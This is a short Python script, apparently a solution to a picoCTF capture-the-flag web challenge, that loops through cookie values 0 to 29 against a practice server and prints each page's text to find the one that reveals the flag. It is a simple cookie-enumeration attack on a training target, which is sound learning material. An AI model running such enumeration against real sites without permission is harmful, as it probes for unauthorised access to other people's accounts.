```python
import requests
from bs4 import BeautifulSoup
s = requests.session()
headers = {'Accept-Encoding': 'identity'}
for i in range(30):
    resp = s.get('http://mercury.picoctf.net:64944/check', cookies = {'name':str(i)}, headers=headers)
    # get the response text.
    html = resp.text

    # parse the HTML
    soup = BeautifulSoup(html, "html.parser")

    # print the HTML as text
    print("Cookie: " + str(i))
    print(soup.body.get_text().strip())
```
